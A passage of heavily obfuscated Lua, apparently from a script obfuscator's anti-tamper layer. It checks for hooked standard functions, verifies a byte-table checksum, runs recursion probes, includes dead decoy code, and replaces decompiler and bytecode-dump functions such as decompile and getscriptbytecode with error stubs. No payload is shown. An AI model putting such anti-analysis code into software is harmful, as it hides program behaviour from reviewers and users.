 if type(_0T7OP6hBYgbR)=="function" and _isl4(_0T7OP6hBYgbR) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(116,97,98,108,101,95,115,111,114,116,95,104) end
 local _0QCtxxTRm84Z=rawget(os or {},string.char(99,108,111,99,107))
 if type(_0QCtxxTRm84Z)=="function" and _isl4(_0QCtxxTRm84Z) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(111,115,95,99,108,111,99,107,95,104) end
 local _0nYmRBphFCNY=rawget(os or {},string.char(116,105,109,101))
 if type(_0nYmRBphFCNY)=="function" and _isl4(_0nYmRBphFCNY) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(111,115,95,116,105,109,101,95,104) end
 local _0O1HwU9Urv8c=rawget(io or {},string.char(114,101,97,100))
 if type(_0O1HwU9Urv8c)=="function" and _isl4(_0O1HwU9Urv8c) then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(105,111,95,114,101,97,100,95,104) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0nco3Lptrt69={34,166,177,226,210,30,117,199,242,72,214,182,235,205,10,170,54,87,83,82,77,8,33,179,203,132,254,41,11,197,54,175,250,83,24,217,115,230,49,173,63,107,19,94,246,101,2,5,22,213,173,153,207,213,188,108,78,133,137,12,38,49,49,88,141,49,14,150,108,110,168,64,20,150,253,79,49,95,99,244,144,138,3,94,77,112,188,70,125,125,208,69,217,11,207,151,234,26,185,198,154,167,59,144,15,117,186,134,233,238,121,238,245,73,156,254,46,202,164,251,199,95,225,145,11,98,151,3,246,26,48,254,19,83,106,253,145,59,72,211,43,124,54,246,59,51,30,142,72,198,18,203,206,241,86,214,251,225,38,46,156,182,74,221,108,141,136,73,28,214,84,239,75,38,253,84,234,143,79,56,75,148,75,183,243,90,151,207,98,21,212,174,164,235,33,3,122,139,97,9}
 local _0LsgTvnObxTR=0
 for _i=1,#_0nco3Lptrt69 do _0LsgTvnObxTR=(_0LsgTvnObxTR+_0nco3Lptrt69[_i]*_i)%65521 end
 if _0LsgTvnObxTR~=25304 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(104,97,115,104,95,109,105,115,109,97,116,99,104) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0pWpIXDOLKdR=0
 local function _0zriBTn38BNk(n) _0pWpIXDOLKdR=_0pWpIXDOLKdR+1;if n>1 then _0zriBTn38BNk(n-1) end end
 _0HPqe1SXm6jO(_0zriBTn38BNk,7)
 if _0pWpIXDOLKdR~=7 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,48) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0owb1FrFTWhA=0
 local function _0AIq3YjdZope(n) _0owb1FrFTWhA=_0owb1FrFTWhA+1;if n>1 then _0AIq3YjdZope(n-1) end end
 _0HPqe1SXm6jO(_0AIq3YjdZope,5)
 if _0owb1FrFTWhA~=5 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0EaTusS_dv0K=0
 local function _0hYCivTrw3bM(n) _0EaTusS_dv0K=_0EaTusS_dv0K+1;if n>1 then _0hYCivTrw3bM(n-1) end end
 _0HPqe1SXm6jO(_0hYCivTrw3bM,5)
 if _0EaTusS_dv0K~=5 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,50) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0qiHrlpFjitC=0
 local function _0WBzyhdu4Nuy(n) _0qiHrlpFjitC=_0qiHrlpFjitC+1;if n>1 then _0WBzyhdu4Nuy(n-1) end end
 _0HPqe1SXm6jO(_0WBzyhdu4Nuy,6)
 if _0qiHrlpFjitC~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,51) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0OF66N5dL0He=0
 local function _0wNefjMN5sgr(n) _0OF66N5dL0He=_0OF66N5dL0He+1;if n>1 then _0wNefjMN5sgr(n-1) end end
 _0HPqe1SXm6jO(_0wNefjMN5sgr,5)
 if _0OF66N5dL0He~=5 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,52) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0RGBeeEQaANz=0
 local function _0ck2XI3L5MJh(n) _0RGBeeEQaANz=_0RGBeeEQaANz+1;if n>1 then _0ck2XI3L5MJh(n-1) end end
 _0HPqe1SXm6jO(_0ck2XI3L5MJh,3)
 if _0RGBeeEQaANz~=3 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,53) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0hDZVlK4lRGE=0
 local function _0f44hN5ZiqvG(n) _0hDZVlK4lRGE=_0hDZVlK4lRGE+1;if n>1 then _0f44hN5ZiqvG(n-1) end end
 _0HPqe1SXm6jO(_0f44hN5ZiqvG,6)
 if _0hDZVlK4lRGE~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,54) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0NKswY0BhOf6=0
 local function _0vUNlIgqkaC9(n) _0NKswY0BhOf6=_0NKswY0BhOf6+1;if n>1 then _0vUNlIgqkaC9(n-1) end end
 _0HPqe1SXm6jO(_0vUNlIgqkaC9,7)
 if _0NKswY0BhOf6~=7 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,55) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0ZcRuEVVXAiN=0
 local function _0TuzW9rwTy_b(n) _0ZcRuEVVXAiN=_0ZcRuEVVXAiN+1;if n>1 then _0TuzW9rwTy_b(n-1) end end
 _0HPqe1SXm6jO(_0TuzW9rwTy_b,5)
 if _0ZcRuEVVXAiN~=5 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,56) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0lseqQi3V3Bk=0
 local function _0PYeWhwnJiiB(n) _0lseqQi3V3Bk=_0lseqQi3V3Bk+1;if n>1 then _0PYeWhwnJiiB(n-1) end end
 _0HPqe1SXm6jO(_0PYeWhwnJiiB,6)
 if _0lseqQi3V3Bk~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,57) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0WDKmLk0c_17=0
 local function _0qYaL34wpm1A(n) _0WDKmLk0c_17=_0WDKmLk0c_17+1;if n>1 then _0qYaL34wpm1A(n-1) end end
 _0HPqe1SXm6jO(_0qYaL34wpm1A,6)
 if _0WDKmLk0c_17~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,48) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0H1CWrvOjss_=0
 local function _0YytbfVfihJE(n) _0H1CWrvOjss_=_0H1CWrvOjss_+1;if n>1 then _0YytbfVfihJE(n-1) end end
 _0HPqe1SXm6jO(_0YytbfVfihJE,3)
 if _0H1CWrvOjss_~=3 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,49) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0n9pZRNm5tBU=0
 local function _0dTgLCG9z9av(n) _0n9pZRNm5tBU=_0n9pZRNm5tBU+1;if n>1 then _0dTgLCG9z9av(n-1) end end
 _0HPqe1SXm6jO(_0dTgLCG9z9av,6)
 if _0n9pZRNm5tBU~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,50) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0MEstROsN89m=0
 local function _0iVh_nft6Zs4(n) _0MEstROsN89m=_0MEstROsN89m+1;if n>1 then _0iVh_nft6Zs4(n-1) end end
 _0HPqe1SXm6jO(_0iVh_nft6Zs4,6)
 if _0MEstROsN89m~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,51) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0w_nJ_XGMu5f=0
 local function _0rA4XYn1gvix(n) _0w_nJ_XGMu5f=_0w_nJ_XGMu5f+1;if n>1 then _0rA4XYn1gvix(n-1) end end
 _0HPqe1SXm6jO(_0rA4XYn1gvix,6)
 if _0w_nJ_XGMu5f~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,52) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0eFX1VLStSau=0
 local function _0lTOOeaIt9ur(n) _0eFX1VLStSau=_0eFX1VLStSau+1;if n>1 then _0lTOOeaIt9ur(n-1) end end
 _0HPqe1SXm6jO(_0lTOOeaIt9ur,3)
 if _0eFX1VLStSau~=3 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,53) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0tlaxGXSitMu=0
 local function _0xmA5iFHKUCj(n) _0tlaxGXSitMu=_0tlaxGXSitMu+1;if n>1 then _0xmA5iFHKUCj(n-1) end end
 _0HPqe1SXm6jO(_0xmA5iFHKUCj,6)
 if _0tlaxGXSitMu~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,54) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0zg0UQuKikv1=0
 local function _0XIMoC8mWJfM(n) _0zg0UQuKikv1=_0zg0UQuKikv1+1;if n>1 then _0XIMoC8mWJfM(n-1) end end
 _0HPqe1SXm6jO(_0XIMoC8mWJfM,6)
 if _0zg0UQuKikv1~=6 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,55) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0ToSNIk9ZhtQ=0
 local function _0Hjh2VbqsPIp(n) _0ToSNIk9ZhtQ=_0ToSNIk9ZhtQ+1;if n>1 then _0Hjh2VbqsPIp(n-1) end end
 _0HPqe1SXm6jO(_0Hjh2VbqsPIp,5)
 if _0ToSNIk9ZhtQ~=5 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,56) end
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0NthMWDIBFMa=0
 local function _0YMWoYm5HoEw(n) _0NthMWDIBFMa=_0NthMWDIBFMa+1;if n>1 then _0YMWoYm5HoEw(n-1) end end
 _0HPqe1SXm6jO(_0YMWoYm5HoEw,5)
 if _0NthMWDIBFMa~=5 then _0DtpP7yxAvKF=true;_0GiJVkgYP2c0=string.char(100,49,57) end
 end)
end
if false then
 local _0EeRd_TFK4ow={(bit32 and bit32.bxor(34199,48485) or 14578),(bit32 and bit32.bxor(18608,34918) or 49366),(bit32 and bit32.bxor(7289,39185) or 34152),(bit32 and bit32.bxor(32753,60177) or 38112),(bit32 and bit32.bxor(44042,29618) or 57272),(bit32 and bit32.bxor(23039,5495) or 19592),(bit32 and bit32.bxor(17129,18225) or 1496),(bit32 and bit32.bxor(40413,19892) or 53353),(bit32 and bit32.bxor(4098,61203) or 65297),(bit32 and bit32.bxor(30772,4355) or 26935),(bit32 and bit32.bxor(31693,37878) or 59451),(bit32 and bit32.bxor(34901,6733) or 37400),(bit32 and bit32.bxor(30909,38421) or 61096),(bit32 and bit32.bxor(32581,57520) or 40949),(bit32 and bit32.bxor(53497,34357) or 22220),(bit32 and bit32.bxor(2036,31280) or 32196),(bit32 and bit32.bxor(48276,44911) or 5115),(bit32 and bit32.bxor(14114,25335) or 21973),(bit32 and bit32.bxor(3712,47867) or 46203),(bit32 and bit32.bxor(47121,6745) or 41544),(bit32 and bit32.bxor(46772,1794) or 45494),(bit32 and bit32.bxor(36836,52515) or 17095),(bit32 and bit32.bxor(2929,33042) or 35427),(bit32 and bit32.bxor(40557,5942) or 35163),(bit32 and bit32.bxor(32537,9591) or 23150),(bit32 and bit32.bxor(57964,1163) or 59111),(bit32 and bit32.bxor(47341,34887) or 12458),(bit32 and bit32.bxor(14380,17188) or 31496),(bit32 and bit32.bxor(51639,34002) or 19813),(bit32 and bit32.bxor(48688,18054) or 63670),(bit32 and bit32.bxor(51158,51153) or 7),(bit32 and bit32.bxor(28787,24274) or 11937),(bit32 and bit32.bxor(28226,44389) or 49959),(bit32 and bit32.bxor(53006,61421) or 8419),(bit32 and bit32.bxor(41268,14781) or 39049),(bit32 and bit32.bxor(19460,57461) or 44145),(bit32 and bit32.bxor(30102,35261) or 64555),(bit32 and bit32.bxor(15091,63662) or 49757),(bit32 and bit32.bxor(39024,22045) or 52845),(bit32 and bit32.bxor(21805,57428) or 46457),(bit32 and bit32.bxor(19642,52469) or 32847),(bit32 and bit32.bxor(57296,243) or 57123),(bit32 and bit32.bxor(4403,39347) or 34944),(bit32 and bit32.bxor(10158,12901) or 5579),(bit32 and bit32.bxor(32127,20949) or 11434),(bit32 and bit32.bxor(30479,47153) or 53054),(bit32 and bit32.bxor(58391,62704) or 4327),(bit32 and bit32.bxor(39534,2332) or 37746),(bit32 and bit32.bxor(25932,35010) or 60814),(bit32 and bit32.bxor(4187,4696) or 515),(bit32 and bit32.bxor(54781,2914) or 56991),(bit32 and bit32.bxor(17098,23982) or 8036),(bit32 and bit32.bxor(44095,31014) or 54553),(bit32 and bit32.bxor(13937,56690) or 60163),(bit32 and bit32.bxor(3114,2602) or 1536),(bit32 and bit32.bxor(33712,19043) or 51667),(bit32 and bit32.bxor(16761,13450) or 30195),(bit32 and bit32.bxor(28662,62308) or 40082),(bit32 and bit32.bxor(14814,41426) or 38924),(bit32 and bit32.bxor(9316,9973) or 657),(bit32 and bit32.bxor(28326,54834) or 47252),(bit32 and bit32.bxor(30304,46427) or 49979),(bit32 and bit32.bxor(56801,5359) or 51470),(bit32 and bit32.bxor(56033,13146) or 59835),(bit32 and bit32.bxor(35279,49764) or 19371),(bit32 and bit32.bxor(1140,8508) or 9544),(bit32 and bit32.bxor(29793,31742) or 3999),(bit32 and bit32.bxor(33529,61388) or 27957),(bit32 and bit32.bxor(27242,57617) or 35707),(bit32 and bit32.bxor(23697,25602) or 14483),(bit32 and bit32.bxor(18626,6930) or 21456),(bit32 and bit32.bxor(41017,5459) or 46442),(bit32 and bit32.bxor(37175,31992) or 60879),(bit32 and bit32.bxor(28417,34168) or 60025),(bit32 and bit32.bxor(43328,15003) or 37851),(bit32 and bit32.bxor(51724,50597) or 4009),(bit32 and bit32.bxor(35775,62450) or 30797),(bit32 and bit32.bxor(21348,17311) or 4347),(bit32 and bit32.bxor(25601,64805) or 39204),(bit32 and bit32.bxor(7087,22920) or 16935),(bit32 and bit32.bxor(34985,61086) or 26167),(bit32 and bit32.bxor(26221,22798) or 16227),(bit32 and bit32.bxor(1454,57682) or 58620),(bit32 and bit32.bxor(35533,23471) or 53602),(bit32 and bit32.bxor(10865,61528) or 55849),(bit32 and bit32.bxor(50318,62341) or 14091),(bit32 and bit32.bxor(37881,39061) or 2924),(bit32 and bit32.bxor(57905,9392) or 50817),(bit32 and bit32.bxor(19403,3876) or 17647),(bit32 and bit32.bxor(2723,25245) or 26686),(bit32 and bit32.bxor(34772,65360) or 30852),(bit32 and bit32.bxor(54487,48906) or 27613),(bit32 and bit32.bxor(13522,5256) or 8282),(bit32 and bit32.bxor(25529,50339) or 42778),(bit32 and bit32.bxor(41444,39157) or 14609),(bit32 and bit32.bxor(28802,3827) or 32369),(bit32 and bit32.bxor(20582,53062) or 40736),(bit32 and bit32.bxor(3727,27115) or 26468),(bit32 and bit32.bxor(31907,56749) or 41230),(bit32 and bit32.bxor(26391,44694) or 51585),(bit32 and bit32.bxor(43124,39157) or 12417),(bit32 and bit32.bxor(48145,5758) or 43631),(bit32 and bit32.bxor(12214,3348) or 8866),(bit32 and bit32.bxor(6753,53913) or 51448),(bit32 and bit32.bxor(34373,8939) or 42158),(bit32 and bit32.bxor(18110,32491) or 14421),(bit32 and bit32.bxor(51946,29521) or 47547),(bit32 and bit32.bxor(34504,22813) or 57301),(bit32 and bit32.bxor(52148,64179) or 12551),(bit32 and bit32.bxor(21159,61661) or 41594),(bit32 and bit32.bxor(13923,47145) or 36426),(bit32 and bit32.bxor(31503,21591) or 12120),(bit32 and bit32.bxor(5624,11915) or 15219),(bit32 and bit32.bxor(52635,31066) or 46273),(bit32 and bit32.bxor(39338,54382) or 19908),(bit32 and bit32.bxor(20757,32751) or 12026),(bit32 and bit32.bxor(57985,35819) or 26986),(bit32 and bit32.bxor(27640,37703) or 63679),(bit32 and bit32.bxor(13448,39144) or 44128),(bit32 and bit32.bxor(33221,1591) or 34802),(bit32 and bit32.bxor(15173,31362) or 16839),(bit32 and bit32.bxor(29882,2894) or 32756),(bit32 and bit32.bxor(42978,11229) or 35903),(bit32 and bit32.bxor(5856,45433) or 42905),(bit32 and bit32.bxor(26424,59788) or 36532),(bit32 and bit32.bxor(50658,25673) or 41387),(bit32 and bit32.bxor(33037,59725) or 26688),(bit32 and bit32.bxor(2419,42726) or 44949),(bit32 and bit32.bxor(2521,3208) or 1361),(bit32 and bit32.bxor(1479,51911) or 52992),(bit32 and bit32.bxor(23191,45926) or 59889),(bit32 and bit32.bxor(52826,38214) or 23324),(bit32 and bit32.bxor(40572,57817) or 32677),(bit32 and bit32.bxor(7096,49556) or 55852),(bit32 and bit32.bxor(26158,3057) or 28127),(bit32 and bit32.bxor(38489,22336) or 49433),(bit32 and bit32.bxor(32345,32328) or 17),(bit32 and bit32.bxor(40741,45814) or 11731),(bit32 and bit32.bxor(46086,55099) or 25405),(bit32 and bit32.bxor(40027,14048) or 43707),(bit32 and bit32.bxor(30622,44268) or 56178),(bit32 and bit32.bxor(18132,6718) or 23786),(bit32 and bit32.bxor(49489,39994) or 23915),(bit32 and bit32.bxor(16659,24171) or 8056),(bit32 and bit32.bxor(36383,34989) or 1714),(bit32 and bit32.bxor(55466,33608) or 23522),(bit32 and bit32.bxor(10480,5575) or 15671),(bit32 and bit32.bxor(41126,27975) or 52705),(bit32 and bit32.bxor(57963,5271) or 63228),(bit32 and bit32.bxor(28848,33020) or 61516),(bit32 and bit32.bxor(31441,21729) or 11824),(bit32 and bit32.bxor(37472,38088) or 1704),(bit32 and bit32.bxor(35643,32592) or 62571),(bit32 and bit32.bxor(40798,9290) or 47892),(bit32 and bit32.bxor(49063,44840) or 4239),(bit32 and bit32.bxor(35956,18334) or 52202),(bit32 and bit32.bxor(3105,61876) or 64917),(bit32 and bit32.bxor(11950,57344) or 52910),(bit32 and bit32.bxor(16760,42769) or 58985),(bit32 and bit32.bxor(1834,6339) or 8169),(bit32 and bit32.bxor(59479,21077) or 47618),(bit32 and bit32.bxor(49205,390) or 49587),(bit32 and bit32.bxor(2644,22244) or 23728),(bit32 and bit32.bxor(50361,23586) or 39067),(bit32 and bit32.bxor(27425,52489) or 42536),(bit32 and bit32.bxor(12377,18575) or 30934),(bit32 and bit32.bxor(9148,13040) or 4428),(bit32 and bit32.bxor(34420,59708) or 28488),(bit32 and bit32.bxor(32200,63963) or 33811),(bit32 and bit32.bxor(12051,55960) or 62859),(bit32 and bit32.bxor(36634,52738) or 16664),(bit32 and bit32.bxor(31875,34593) or 64418),(bit32 and bit32.bxor(56715,47227) or 26096),(bit32 and bit32.bxor(33665,36326) or 3687),(bit32 and bit32.bxor(20579,62395) or 41944),(bit32 and bit32.bxor(48716,61095) or 20715),(bit32 and bit32.bxor(16732,62611) or 46543),(bit32 and bit32.bxor(47837,47937) or 412),(bit32 and bit32.bxor(28282,988) or 28070),(bit32 and bit32.bxor(26066,24248) or 15210),(bit32 and bit32.bxor(59742,13029) or 56251),(bit32 and bit32.bxor(56290,61092) or 13638),(bit32 and bit32.bxor(31961,53559) or 44526),(bit32 and bit32.bxor(29122,20412) or 15998),(bit32 and bit32.bxor(40124,31403) or 58903),(bit32 and bit32.bxor(49302,60838) or 11568),(bit32 and bit32.bxor(31069,54360) or 44293),(bit32 and bit32.bxor(31466,48922) or 50672),(bit32 and bit32.bxor(8209,396) or 8605),(bit32 and bit32.bxor(9783,44082) or 35333),(bit32 and bit32.bxor(25856,15024) or 24496),(bit32 and bit32.bxor(27429,63449) or 40188),(bit32 and bit32.bxor(20525,26740) or 14425),(bit32 and bit32.bxor(6759,20270) or 21833),(bit32 and bit32.bxor(14859,23021) or 25574),(bit32 and bit32.bxor(35526,44212) or 9842),(bit32 and bit32.bxor(4964,22628) or 19200),(bit32 and bit32.bxor(28979,41654) or 54149),(bit32 and bit32.bxor(41839,55397) or 31498),(bit32 and bit32.bxor(41209,57621) or 16876),(bit32 and bit32.bxor(12561,52861) or 65388),(bit32 and bit32.bxor(16943,55166) or 38225),(bit32 and bit32.bxor(49260,30873) or 47349),(bit32 and bit32.bxor(30411,48423) or 52204),(bit32 and bit32.bxor(12528,22591) or 26831),(bit32 and bit32.bxor(7433,10044) or 14901),(bit32 and bit32.bxor(33126,742) or 33664),(bit32 and bit32.bxor(1543,41593) or 42110),(bit32 and bit32.bxor(6481,29878) or 28135),(bit32 and bit32.bxor(14366,35961) or 46183),(bit32 and bit32.bxor(31783,47115) or 50220),(bit32 and bit32.bxor(57168,62030) or 11550),(bit32 and bit32.bxor(55672,51472) or 4200),(bit32 and bit32.bxor(26082,40806) or 64132),(bit32 and bit32.bxor(57400,37674) or 29458),(bit32 and bit32.bxor(42235,19307) or 61328),(bit32 and bit32.bxor(10963,53208) or 58635),(bit32 and bit32.bxor(4746,28393) or 31843),(bit32 and bit32.bxor(36851,12749) or 48702),(bit32 and bit32.bxor(38981,51479) or 20818),(bit32 and bit32.bxor(30378,43899) or 56785),(bit32 and bit32.bxor(17635,32474) or 14905),(bit32 and bit32.bxor(27344,20271) or 9727),(bit32 and bit32.bxor(59110,45112) or 22238),(bit32 and bit32.bxor(4323,45755) or 41560),(bit32 and bit32.bxor(3460,57065) or 54125),(bit32 and bit32.bxor(27356,3668) or 25736),(bit32 and bit32.bxor(29137,7448) or 27849),(bit32 and bit32.bxor(11389,24326) or 29563),(bit32 and bit32.bxor(36653,34962) or 1983),(bit32 and bit32.bxor(36206,64249) or 30615),(bit32 and bit32.bxor(30414,758) or 29752),(bit32 and bit32.bxor(45702,21758) or 59000),(bit32 and bit32.bxor(44632,5273) or 47809),(bit32 and bit32.bxor(50745,40280) or 23393),(bit32 and bit32.bxor(30708,18526) or 16298),(bit32 and bit32.bxor(54293,64117) or 11872),(bit32 and bit32.bxor(1026,63996) or 65022),(bit32 and bit32.bxor(20167,23816) or 5071),(bit32 and bit32.bxor(59145,32083) or 39514),(bit32 and bit32.bxor(12928,46515) or 34611),(bit32 and bit32.bxor(48454,30443) or 52141),(bit32 and bit32.bxor(30074,10632) or 23794),(bit32 and bit32.bxor(29221,8151) or 28146),(bit32 and bit32.bxor(30904,23122) or 8938),(bit32 and bit32.bxor(49267,29214) or 45677),(bit32 and bit32.bxor(4698,26877) or 31399),(bit32 and bit32.bxor(37717,19525) or 57104),(bit32 and bit32.bxor(12727,50475) or 62620),(bit32 and bit32.bxor(52838,59730) or 10036),(bit32 and bit32.bxor(52687,47460) or 29867),(bit32 and bit32.bxor(15615,43006) or 39681),(bit32 and bit32.bxor(38144,47911) or 11815),(bit32 and bit32.bxor(6170,14235) or 12161),(bit32 and bit32.bxor(41449,37325) or 12324),(bit32 and bit32.bxor(21430,52642) or 40468),(bit32 and bit32.bxor(52040,57636) or 10860),(bit32 and bit32.bxor(4687,18) or 4701),(bit32 and bit32.bxor(37378,16128) or 44290),(bit32 and bit32.bxor(32886,16928) or 49750),(bit32 and bit32.bxor(39866,47771) or 8481),(bit32 and bit32.bxor(2717,27118) or 25459),(bit32 and bit32.bxor(17826,49710) or 34700),(bit32 and bit32.bxor(26026,13225) or 22019),(bit32 and bit32.bxor(44392,54060) or 32324),(bit32 and bit32.bxor(9048,13159) or 4159),(bit32 and bit32.bxor(57435,13254) or 54173),(bit32 and bit32.bxor(14037,49897) or 62524),(bit32 and bit32.bxor(45738,13291) or 33089),(bit32 and bit32.bxor(7207,5025) or 3974),(bit32 and bit32.bxor(31934,26128) or 6830),(bit32 and bit32.bxor(57522,11129) or 52171),(bit32 and bit32.bxor(37285,37550) or 779),(bit32 and bit32.bxor(49249,64287) or 15230),(bit32 and bit32.bxor(41182,46396) or 5602),(bit32 and bit32.bxor(47907,45594) or 2361),(bit32 and bit32.bxor(42633,15461) or 39660),(bit32 and bit32.bxor(3047,60528) or 59287),(bit32 and bit32.bxor(23065,34338) or 56379),(bit32 and bit32.bxor(34813,61196) or 26865),(bit32 and bit32.bxor(53870,17205) or 37211),(bit32 and bit32.bxor(45562,52012) or 31446),(bit32 and bit32.bxor(30311,62143) or 34008),(bit32 and bit32.bxor(25143,20233) or 11582),(bit32 and bit32.bxor(33142,41966) or 8856),(bit32 and bit32.bxor(40713,64983) or 25310),(bit32 and bit32.bxor(53324,36354) or 24142),(bit32 and bit32.bxor(25667,28897) or 5282),(bit32 and bit32.bxor(41038,37503) or 12849),(bit32 and bit32.bxor(40797,22967) or 50922),(bit32 and bit32.bxor(19451,65013) or 46606),(bit32 and bit32.bxor(6972,3148) or 6000),(bit32 and bit32.bxor(17281,56884) or 40373),(bit32 and bit32.bxor(13240,23078) or 27038),(bit32 and bit32.bxor(27473,1320) or 28281),(bit32 and bit32.bxor(23427,3886) or 21677),(bit32 and bit32.bxor(43164,8151) or 46923),(bit32 and bit32.bxor(27107,28181) or 2038),(bit32 and bit32.bxor(12444,15361) or 3229),(bit32 and bit32.bxor(27415,17052) or 10635)}
 local _0oECEg8PF257=1;local _0rpHikjcRZDX={};local _0h03RiefRxkT={}
 repeat
 local _d=_0h03RiefRxkT[_0oECEg8PF257]
 if not(_d<64) then if not(_d<128) then if not(_d<192) then _d=_d else _d=_d+1 end else _d=_d end else _d=_d end
 _0oECEg8PF257=_0oECEg8PF257+1
 until _0oECEg8PF257>#_0h03RiefRxkT
end
do
 _0HPqe1SXm6jO(function()
 local _0XapqzK73geI=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,99,111,109,112,105,108,101))
 if type(_0XapqzK73geI)=="function" then rawset(_G,string.char(100,101,99,111,109,112,105,108,101),function()error("")end) end
 local _0Me6iUhI2vZw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,117,109,112,115,116,114,105,110,103))
 if type(_0Me6iUhI2vZw)=="function" then rawset(_G,string.char(100,117,109,112,115,116,114,105,110,103),function()error("")end) end
 local _0Bf1huACNoHt=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101))
 if type(_0Bf1huACNoHt)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101),function()error("")end) end
 local _0JmHPRW_E0aa=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101))
 if type(_0JmHPRW_E0aa)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101),function()error("")end) end
 local _0JaY4Sp3_20o=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,110,115,116,97,110,116,115))
 if type(_0JaY4Sp3_20o)=="function" then rawset(_G,string.char(103,101,116,99,111,110,115,116,97,110,116,115),function()error("")end) end
 local _0WyKN7BdnE3K=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,117,112,118,97,108,117,101,115))
 if type(_0WyKN7BdnE3K)=="function" then rawset(_G,string.char(103,101,116,117,112,118,97,108,117,101,115),function()error("")end) end
 local _0ZXaoDru8oEV=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,112,114,111,116,111,115))
 if type(_0ZXaoDru8oEV)=="function" then rawset(_G,string.char(103,101,116,112,114,111,116,111,115),function()error("")end) end
 _0HPqe1SXm6jO(function() rawset(string,string.char(100,117,109,112),function()error("")end) end)
 end)
end
do
 _0HPqe1SXm6jO(function()
 local _0b34ObMCy1Rn=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,101,99,111,109,112,105,108,101))
 if type(_0b34ObMCy1Rn)=="function" then rawset(_G,string.char(100,101,99,111,109,112,105,108,101),function()error("")end) end
 local _0LZJqK6LEIQx=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(100,117,109,112,115,116,114,105,110,103))
 if type(_0LZJqK6LEIQx)=="function" then rawset(_G,string.char(100,117,109,112,115,116,114,105,110,103),function()error("")end) end
 local _0j3phoCg_ptw=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101))
 if type(_0j3phoCg_ptw)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,98,121,116,101,99,111,100,101),function()error("")end) end
 local _0EFeifooOtJc=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101))
 if type(_0EFeifooOtJc)=="function" then rawset(_G,string.char(103,101,116,115,99,114,105,112,116,99,108,111,115,117,114,101),function()error("")end) end
 local _0e684xyR6phv=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,99,111,110,115,116,97,110,116,115))
 if type(_0e684xyR6phv)=="function" then rawset(_G,string.char(103,101,116,99,111,110,115,116,97,110,116,115),function()error("")end) end
 local _0ONtkEM5RrP8=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,117,112,118,97,108,117,101,115))
 if type(_0ONtkEM5RrP8)=="function" then rawset(_G,string.char(103,101,116,117,112,118,97,108,117,101,115),function()error("")end) end
 local _0QM1ZbJWeSV0=rawget((type(getfenv)=="function" and getfenv(0) or _G),string.char(103,101,116,112,114,111,116,111,115))
